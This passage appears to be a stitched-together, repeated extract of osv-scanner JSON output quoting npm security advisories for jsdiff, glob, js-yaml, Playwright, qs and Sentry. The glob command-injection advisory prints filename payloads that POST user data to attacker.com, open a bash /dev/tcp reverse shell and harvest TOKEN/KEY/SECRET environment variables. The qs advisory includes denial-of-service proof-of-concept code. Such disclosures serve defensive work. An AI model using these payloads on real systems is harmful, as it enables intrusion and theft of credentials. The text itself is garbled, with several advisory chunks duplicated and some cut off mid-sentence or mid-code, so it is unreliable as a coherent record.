It then consumes memory without limit until the process crashes due to running out of memory.\n\nApplications are therefore likely to be vulnerable to a denial-of-service attack if they call `parsePatch` with a user-provided patch as input. A large payload is not needed to trigger the vulnerability, so size limits on user input do not provide any protection. Furthermore, some applications may be vulnerable even when calling `parsePatch` on a patch generated by the application itself if the user is nonetheless able to control the filename headers (e.g. by directly providing the filenames of the files to be diffed).\n\nThe `applyPatch` method is similarly affected if (and only if) called with a string representation of a patch as an argument, since under the hood it parses that string using `parsePatch`. Other methods of the library are unaffected.\n\nFinally, a second and lesser bug - a ReDOS - also exhibits when those same line break characters are present in a patch's *patch* header (also known as its \"leading garbage\"). A maliciously-crafted patch header of length *n* can take `parsePatch` O(*n*³) time to parse.\n\n### Patches\n\nAll vulnerabilities described are fixed in v8.0.3.\n\n### Workarounds\n\nIf using a version of jsdiff earlier than v8.0.3, do not attempt to parse patches that contain any of these characters: `\\r`, `\\u2028`, or `\\u2029`.\n\n### References\n\nPR that fixed the bug: https://github.com/kpdecker/jsdiff/pull/649\n\n\n### CVE Notes\n\nNote that although the advisory describes two bugs, they each enable exactly the same attack vector (that an attacker who controls input to `parsePatch` can cause a DOS). Fixing one bug without fixing the other therefore does not fix the vulnerability and does not provide any security benefit.

When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () => foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c <command> <pattern>` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory && cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)\ntouch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.","references":[{"type":"WEB","url":"https://github.com/isaacs/node-glob/security/advisories/GHSA-5j98-mcp5-4vw2"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2025-64756"},{"type":"WEB","url":"https://github.com/isaacs/node-glob/commit/1e4e297342a09f2aa0ced87fcd4a70ddc325d75f"},{"type":"WEB","url":"https://github.com/isaacs/node-glob/commit/47473c046b91c67269df7a66eab782a6c2716146"},{"type":"PACKAGE","url":"https://github.com/isaacs/node-glob"}],"aliases":["CVE-2025-64756"]},"source":{"scanner":"osv-scanner","scannedAt":"2026-01-25T13:30:59.111Z"}},{"id":"GHSA-mh29-5h37-fv8m@js-yaml-3.14.1","package":{"name":"js-yaml","version":"3.14.1","ecosystem":"npm","purl":"pkg:npm/js-yaml"},"severity":{"level":"moderate","type":"CVSS_V3","vector":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"},"affectedVersions":{"ranges":[{"introduced":"4.0.0","fixed":"4.1.1"}]},"fix":{"available":true,"version":"4.1.1"},"details":{"title":"js-yaml has prototype pollution in merge (<<)","description":"### Impact\n\nIn js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`).

An attacker performs a MitM attack on a network where the victim runs one of these scripts.\n2. The attacker intercepts the HTTPS request and serves a malicious package (for example, a trojaned browser installer).\n3. Because `curl -k` is used, the script downloads and installs the attacker's payload without any certificate validation.\n4. The attacker's code is executed with system privileges, leading to full compromise.\n\nNo special configuration is needed: simply running these scripts on any untrusted or hostile network is enough.\n\n### Impact\nThis is a critical Remote Code Execution (RCE) vulnerability due to improper SSL certificate validation (CWE-295: Improper Certificate Validation). Any user or automation running these scripts is at risk of arbitrary code execution as root/admin, system compromise, data theft, or persistent malware installation. The risk is especially severe because browser packages are installed with elevated privileges and the scripts may be used in CI/CD or developer environments.\n\n### Fix\n\n - https://github.com/microsoft/playwright/commit/72c62d840247d9defd87c6beb0344d456794b570\n - https://github.com/microsoft/playwright/pull/37532\n - https://github.com/microsoft/playwright/releases/tag/v1.56.0\n\n### Credit\n\n- This vulnerability was uncovered by tooling by [Socket](https://socket.dev/)\n- This vulnerability was confirmed by @evilpacket\n- This vulnerability was reported by @JLLeitschuh at Socket\n\n### Disclosure\n - September 10th, 2025 - Disclosed to Microsoft privately via https://github.com/microsoft/playwright/security/advisories/GHSA-gx27-2j22-qcx8\n - September 11th, 2025 - Reported to Microsoft via MSRC Researcher Portal - https://msrc.microsoft.com/report/vulnerability/VULN-162854\n - September 11th, 2025 - Microsoft closed report as \"Complete - N/A\"\n - September 18th, 2025 - Following a [LinkedIn Post](https://www.linkedin.com/posts/jonathan-leitschuh_its-a-sad-state-of-the-world-when-i-acknowledge-activity-7374601182117511168--wnI?utm_source=social_share_send&utm_medium=member_desktop_web&rcm=ACoAAA0SLMUBScBUspIv0-LQ1ecAwsqt5l81eG4)","references":[{"type":"WEB","url":"https://github.com/SocketDev/security-research/security/advisories/GHSA-qxm8-4v54-964r"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2025-59288"},{"type":"WEB","url":"https://github.com/microsoft/playwright/pull/37532"},{"type":"WEB","url":"https://github.com/microsoft/playwright/commit/72c62d840247d9defd87c6beb0344d456794b570"},{"type":"PACKAGE","url":"https://github.com/microsoft/playwright"},{"type":"WEB","url":"https://github.com/microsoft/playwright/releases/tag/v1.55.1"},{"type":"WEB","url":"https://github.com/microsoft/playwright/releases/tag/v1.56.0"},{"type":"WEB","url":"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-59288"}],"aliases":["CVE-2025-59288"]},"source":{"scanner":"osv-scanner","scannedAt":"2026-01-25T13:30:59.113Z"}},{"id":"GHSA-6rw7-vpxm-498p@qs-6.14.0","package":{"name":"qs","version":"6.14.0","ecosystem":"npm","purl":"pkg:npm/qs"},"severity":{"level":"high","type":"CVSS_V3","vector":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"},"affectedVersions":{"ranges":[{"introduced":"0","fixed":"6.14.1"}]},"fix":{"available":true,"version":"6.14.1"},"details":{"title":"qs's arrayLimit bypass in its bracket notation allows DoS via memory exhaustion","description":"### Summary\n\nThe `arrayLimit` option in qs does not enforce limits for bracket notation (`a[]=1&a[]=2`), allowing attackers to cause denial-of-service via memory exhaustion. Applications using `arrayLimit` for DoS protection are vulnerable.\n\n### Details\n\nThe `arrayLimit` option only checks limits for indexed notation (`a[0]=1&a[1]=2`) but completely bypasses it for bracket notation (`a[]=1&a[]=2`).\n\n**Vulnerable code** (`lib/parse.js:159-162`):\n```javascript\nif (root === '[]' && options.parseArrays) {\n    obj = utils.combine([], leaf);  // No arrayLimit check\n}\n```\n\n**Working code** (`lib/parse.js:175`):\n```javascript\nelse if (index <= options.arrayLimit) {  // Limit checked here\n    obj = [];\n    obj[index] = leaf;\n}\n```\n\nThe bracket notation handler at line 159 uses `utils.combine([], leaf)` without validating against `options.arrayLimit`, while indexed notation at line 175 checks `index <= options.arrayLimit` before creating arrays.\n\n### PoC\n\n**Test 1 - Basic bypass:**\n```bash\nnpm install qs\n```\n\n```javascript\nconst qs = require('qs');\nconst result = qs.parse('a[]=1&a[]=2&a[]=3&a[]=4&a[]=5&a[]=6', { arrayLimit: 5 });\nconsole.log(result.a.length);  // Output: 6 (should be max 5)\n```\n\n**Test 2 - DoS demonstration:**\n```javascript\nconst qs = require('qs');\nconst attack = 'a[]=' + Array(10000).fill('x').join('&a[]=');\nconst result = qs.parse(attack, { arrayLimit: 100 });\nconsole.log(result.a.length);  // Output: 10000 (should be max 100)\n```\n\n**Configuration:**\n- `arrayLimit: 5` (test 1) or `arrayLimit: 100` (test 2)\n- Use bracket notation: `a[]=value` (not indexed `a[0]=value`)\n\n### Impact\n\nDenial of Service via memory exhaustion. Affects applications using `qs.parse()` with user-controlled input and `arrayLimit` for protection.\n\n**Attack scenario:**\n1. Attacker sends HTTP request: `GET /api/search?filters[]=x&filters[]=x&...&filters[]=x` (100,000+ times)\n2. Application parses with `qs.parse(query, { arrayLimit: 100 })`\n3. qs ignores limit, parses all 100,000 elements into array\n4. Server memory exhausted → application crashes or becomes unresponsive\n5. Service unavailable for all users\n\n**Real-world impact:**\n- Single malicious request can crash server\n- No authentication required\n- Easy to automate and scale\n- Affects any endpoint parsing query strings with bracket notation\n\n### Suggested Fix\n\nAdd `arrayLimit` validation to the bracket notation handler. The code already calculates `currentArrayLength` at line 147-151, but it's not used in the bracket notation handler at line 159.\n\n**Current code** (`lib/parse.js:159-162`):\n```javascript\nif (root === '[]' && options.parseArrays) {\n    obj = options.allowEmptyArrays && (leaf === '' || (options.strictNullHandling && leaf === null))\n        ? []\n        : utils.combine([], leaf);  // No arrayLimit check\n}\n```\n\n**Fixed code**:\n```javascript\nif (root === '[]' && options.parseArrays) {\n    // Use currentArrayLength already calculated at line 147-151\n    if (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) {\n        throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n    }\n    \n    // If limit exceeded and not throwing, convert to object (consistent with indexed notation behavior)\n    if (currentArrayLength >= options.arrayLimit) {\n        obj = options.plainObjects ? { __proto__: null } : {};\n        obj[currentArrayLength] = leaf;\n    } else {\n        obj = options.allowEmptyArrays && (leaf === '' || (options.strictNullHandling && leaf === null))\n            ? []\n            : utils.combine([], leaf);\n    }\n}\n```\n\nThis makes bracket notation behaviour consistent with indexed notation, enforcing `arrayLimit` and converting to object when limit is exceeded (per README documentation).","references":[{"type":"WEB","url":"https://github.com/ljharb/qs/security/advisories/GHSA-6rw7-vpxm-498p"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2025-15284"},{"type":"WEB","url":"https://github.com/ljharb/qs/commit/3086902ecf7f088d0d1803887643ac6c03d415b9"},{"type":"PACKAGE","url":"https://github.com/ljharb/qs"}],"aliases":["CVE-2025-15284"]},"source":{"scanner":"osv-scanner","scannedAt":"2026-01-25T13:30:59.113Z"}},{"id":"GHSA-6465-jgvq-jhgp@@sentry/nextjs-10.11.0","package":{"name":"@sentry/nextjs","version":"10.11.0","ecosystem":"npm","purl":"pkg:npm/%40sentry/nextjs"},"severity":{"level":"moderate","type":"CVSS_V4","vector":"CVSS:4.0/AV:N/AC:L/AT:P/PR:H/UI:N/VC:N/VI:N/VA:N/SC:H/SI:L/SA:L"},"affectedVersions":{"ranges":[{"introduced":"10.11.0","fixed":"10.27.0"}]},"fix":{"available":true,"version":"10.27.0"},"details":{"title":"Sentry's sensitive headers are leaked when `sendDefaultPii` is set to `true`","description":"### Impact\nIn version 10.11.0, a change to how the SDK collects request data in Node.js applications caused certain incoming HTTP headers to be added as trace span attributes.

It then consumes memory without limit until the process crashes due to running out of memory.\n\nApplications are therefore likely to be vulnerable to a denial-of-service attack if they call `parsePatch` with a user-provided patch as input. A large payload is not needed to trigger the vulnerability, so size limits on user input do not provide any protection. Furthermore, some applications may be vulnerable even when calling `parsePatch` on a patch generated by the application itself if the user is nonetheless able to control the filename headers (e.g. by directly providing the filenames of the files to be diffed).\n\nThe `applyPatch` method is similarly affected if (and only if) called with a string representation of a patch as an argument, since under the hood it parses that string using `parsePatch`. Other methods of the library are unaffected.\n\nFinally, a second and lesser bug - a ReDOS - also exhibits when those same line break characters are present in a patch's *patch* header (also known as its \"leading garbage\"). A maliciously-crafted patch header of length *n* can take `parsePatch` O(*n*³) time to parse.\n\n### Patches\n\nAll vulnerabilities described are fixed in v8.0.3.\n\n### Workarounds\n\nIf using a version of jsdiff earlier than v8.0.3, do not attempt to parse patches that contain any of these characters: `\\r`, `\\u2028`, or `\\u2029`.\n\n### References\n\nPR that fixed the bug: https://github.com/kpdecker/jsdiff/pull/649\n\n\n### CVE Notes\n\nNote that although the advisory describes two bugs, they each enable exactly the same attack vector (that an attacker who controls input to `parsePatch` can cause a DOS).

When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () => foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c <command> <pattern>` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory && cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)\ntouch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.","references":[{"type":"WEB","url":"https://github.com/isaacs/node-glob/security/advisories/GHSA-5j98-mcp5-4vw2"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2025-64756"},{"type":"WEB","url":"https://github.com/isaacs/node-glob/commit/1e4e297342a09f2aa0ced87fcd4a70ddc325d75f"},{"type":"WEB","url":"https://github.com/isaacs/node-glob/commit/47473c046b91c67269df7a66eab782a6c2716146"},{"type":"PACKAGE","url":"https://github.com/isaacs/node-glob"}],"aliases":["CVE-2025-64756"]},"source":{"scanner":"osv-scanner","scannedAt":"2026-01-25T13:30:59.128Z"}},{"id":"GHSA-mh29-5h37-fv8m@js-yaml-3.14.1","package":{"name":"js-yaml","version":"3.14.1","ecosystem":"npm","purl":"pkg:npm/js-yaml"},"severity":{"level":"moderate","type":"CVSS_V3","vector":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"},"affectedVersions":{"ranges":[{"introduced":"4.0.0","fixed":"4.1.1"}]},"fix":{"available":true,"version":"4.1.1"},"details":{"title":"js-yaml has prototype pollution in merge (<<)","description":"### Impact\n\nIn js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`).

This can lead to full system compromise, as the downloaded files are installed as privileged applications.\n\n### Details\nThe following scripts in the `microsoft/playwright` repository at commit [`bee11cbc28f24bd18e726163d0b9b1571b4f26a8`](https://github.com/microsoft/playwright/commit/bee11cbc28f24bd18e726163d0b9b1571b4f26a8) use `curl -k` to fetch and install executable packages without verifying the authenticity of the SSL certificate:\n\n\n- [`packages/playwright-core/bin/reinstall_chrome_beta_mac.sh`](https://github.com/microsoft/playwright/blob/bee11cbc28f24bd18e726163d0b9b1571b4f26a8/packages/playwright-core/bin/reinstall_chrome_beta_mac.sh)\n- [`packages/playwright-core/bin/reinstall_chrome_stable_mac.sh`](https://github.com/microsoft/playwright/blob/bee11cbc28f24bd18e726163d0b9b1571b4f26a8/packages/playwright-core/bin/reinstall_chrome_stable_mac.sh)\n- [`packages/playwright-core/bin/reinstall_msedge_dev_mac.sh`](https://github.com/microsoft/playwright/blob/bee11cbc28f24bd18e726163d0b9b1571b4f26a8/packages/playwright-core/bin/reinstall_msedge_dev_mac.sh)\n- [`packages/playwright-core/bin/reinstall_msedge_beta_mac.sh`](https://github.com/microsoft/playwright/blob/bee11cbc28f24bd18e726163d0b9b1571b4f26a8/packages/playwright-core/bin/reinstall_msedge_beta_mac.sh)\n- [`packages/playwright-core/bin/reinstall_msedge_stable_mac.sh`](https://github.com/microsoft/playwright/blob/bee11cbc28f24bd18e726163d0b9b1571b4f26a8/packages/playwright-core/bin/reinstall_msedge_stable_mac.sh)\n\nIn each case, the shell scripts download a browser installer package using `curl -k` and immediately install it:\n\n```shell\ncurl --retry 3 -o ./<pkg-file> -k <url>\nsudo installer -pkg /tmp/<pkg-file> -target /\n```\n\nDisabling SSL verification (`-k`) means the download can be intercepted and replaced with malicious content.\n\n### PoC\nA high-level exploitation scenario:\n\n1. An attacker performs a MitM attack on a network where the victim runs one of these scripts.\n2. The attacker intercepts the HTTPS request and serves a malicious package (for example, a trojaned browser installer).\n3. Because `curl -k` is used, the script downloads and installs the attacker's payload without any certificate validation.\n4. The attacker's code is executed with system privileges, leading to full compromise.\n\nNo special configuration is needed: simply running these scripts on any untrusted or hostile network is enough.\n\n### Impact\nThis is a critical Remote Code Execution (RCE) vulnerability due to improper SSL certificate validation (CWE-295: Improper Certificate Validation). Any user or automation running these scripts is at risk of arbitrary code execution as root/admin, system compromise, data theft, or persistent malware installation. The risk is especially severe because browser packages are installed with elevated privileges and the scripts may be used in CI/CD or developer environments.\n\n### Fix\n\n - https://github.com/microsoft/playwright/commit/72c62d840247d9defd87c6beb0344d456794b570\n - https://github.com/microsoft/playwright/pull/37532\n - https://github.com/microsoft/playwright/releases/tag/v1.56.0\n\n### Credit\n\n- This vulnerability was uncovered by tooling by [Socket](https://socket.dev/)\n- This vulnerability was confirmed by @evilpacket\n- This vulnerability was reported by @JLLeitschuh at Socket\n\n### Disclosure\n - September 10th, 2025 - Disclosed to Microsoft privately via https://github.com/microsoft/playwright/security/advisories/GHSA-gx27-2j22-qcx8\n - September 11th, 2025 - Reported to Microsoft via MSRC Researcher Portal - https://msrc.microsoft.com/report/vulnerability/VULN-162854\n - September 11th, 2025 - Microsoft closed report as \"Complete - N/A\"\n - September 18th, 2025 - Following a [LinkedIn Post](https://www.linkedin.com/posts/jonathan-leitschuh_its-a-sad-state-of-the-world-when-i-acknowledge-activity-7374601182117511168--wnI?utm_source=social_share_send&utm_medium=member_desktop_web&rcm=ACoAAA0SLMUBScBUspIv0-LQ1ecAwsqt5l81eG4)","references":[{"type":"WEB","url":"https://github.com/SocketDev/security-research/security/advisories/GHSA-qxm8-4v54-964r"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2025-59288"},{"type":"WEB","url":"https://github.com/microsoft/playwright/pull/37532"},{"type":"WEB","url":"https://github.com/microsoft/playwright/commit/72c62d840247d9defd87c6beb0344d456794b570"},{"type":"PACKAGE","url":"https://github.com/microsoft/playwright"},{"type":"WEB","url":"https://github.com/microsoft/playwright/releases/tag/v1.55.1"},{"type":"WEB","url":"https://github.com/microsoft/playwright/releases/tag/v1.56.0"},{"type":"WEB","url":"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-59288"}],"aliases":["CVE-2025-59288"]},"source":{"scanner":"osv-scanner","scannedAt":"2026-01-25T13:30:59.131Z"}},{"id":"GHSA-6rw7-vpxm-498p@qs-6.14.0","package":{"name":"qs","version":"6.14.0","ecosystem":"npm","purl":"pkg:npm/qs"},"severity":{"level":"high","type":"CVSS_V3","vector":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"},"affectedVersions":{"ranges":[{"introduced":"0","fixed":"6.14.1"}]},"fix":{"available":true,"version":"6.14.1"},"details":{"title":"qs's arrayLimit bypass in its bracket notation allows DoS via memory exhaustion","description":"### Summary\n\nThe `arrayLimit` option in qs does not enforce limits for bracket notation (`a[]=1&a[]=2`), allowing attackers to cause denial-of-service via memory exhaustion. Applications using `arrayLimit` for DoS protection are vulnerable.\n\n### Details\n\nThe `arrayLimit` option only checks limits for indexed notation (`a[0]=1&a[1]=2`) but completely bypasses it for bracket notation (`a[]=1&a[]=2`).\n\n**Vulnerable code** (`lib/parse.js:159-162`):\n```javascript\nif (root === '[]' && options.parseArrays) {\n    obj = utils.combine([], leaf);  // No arrayLimit check\n}\n```\n\n**Working code** (`lib/parse.js:175`):\n```javascript\nelse if (index <= options.arrayLimit) {  // Limit checked here\n    obj = [];\n    obj[index] = leaf;\n}\n```\n\nThe bracket notation handler at line 159 uses `utils.combine([], leaf)` without validating against `options.arrayLimit`, while indexed notation at line 175 checks `index <= options.arrayLimit` before creating arrays.\n\n### PoC\n\n**Test 1 - Basic bypass:**\n```bash\nnpm install qs\n```\n\n```javascript\nconst qs = require('qs');\nconst result = qs.parse('a[]=1&a[]=2&a[]=3&a[]=4&a[]=5&a[]=6', { arrayLimit: 5 });\nconsole.log(result.a.length);  // Output: 6 (should be max 5)\n```\n\n**Test 2 - DoS demonstration:**\n```javascript\nconst qs = require('qs');\nconst attack = 'a[]=' + Array(10000).fill('x').join('&a[]=');\nconst result = qs.parse(attack, { arrayLimit: 100 });\nconsole.log(result.a.length);  // Output: 10000 (should be max 100)\n```\n\n**Configuration:**\n- `arrayLimit: 5` (test 1) or `arrayLimit: 100` (test 2)\n- Use bracket notation: `a[]=value` (not indexed `a[0]=value`)\n\n### Impact\n\nDenial of Service via memory exhaustion. Affects applications using `qs.parse()` with user-controlled input and `arrayLimit` for protection.\n\n**Attack scenario:**\n1. Attacker sends HTTP request: `GET /api/search?filters[]=x&filters[]=x&...&filters[]=x` (100,000+ times)\n2. Application parses with `qs.parse(query, { arrayLimit: 100 })`\n3. qs ignores limit, parses all 100,000 elements into array\n4. Server memory exhausted → application crashes or becomes unresponsive\n5. Service unavailable for all users\n\n**Real-world impact:**\n- Single malicious request can crash server\n- No authentication required\n- Easy to automate and scale\n- Affects any endpoint parsing query strings with bracket notation\n\n### Suggested Fix\n\nAdd `arrayLimit` validation to the bracket notation handler. The code already calculates `currentArrayLength` at line 147-151, but it's not used in the bracket notation handler at line 159.\n\n**Current code** (`lib/parse.js:159-162`):\n```javascript\nif (root === '[]' && options.parseArrays) {\n    obj = options.allowEmptyArrays && (leaf === '' || (options.strictNullHandling && leaf === null))\n        ?

Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ?

It then consumes memory without limit until the process crashes due to running out of memory.\n\nApplications are therefore likely to be vulnerable to a denial-of-service attack if they call `parsePatch` with a user-provided patch as input. A large payload is not needed to trigger the vulnerability, so size limits on user input do not provide any protection. Furthermore, some applications may be vulnerable even when calling `parsePatch` on a patch generated by the application itself if the user is nonetheless able to control the filename headers (e.g. by directly providing the filenames of the files to be diffed).\n\nThe `applyPatch` method is similarly affected if (and only if) called with a string representation of a patch as an argument, since under the hood it parses that string using `parsePatch`. Other methods of the library are unaffected.\n\nFinally, a second and lesser bug - a ReDOS - also exhibits when those same line break characters are present in a patch's *patch* header (also known as its \"leading garbage\"). A maliciously-crafted patch header of length *n* can take `parsePatch` O(*n*³) time to parse.\n\n### Patches\n\nAll vulnerabilities described are fixed in v8.0.3.\n\n### Workarounds\n\nIf using a version of jsdiff earlier than v8.0.3, do not attempt to parse patches that contain any of these characters: `\\r`, `\\u2028`, or `\\u2029`.\n\n### References\n\nPR that fixed the bug: https://github.com/kpdecker/jsdiff/pull/649\n\n\n### CVE 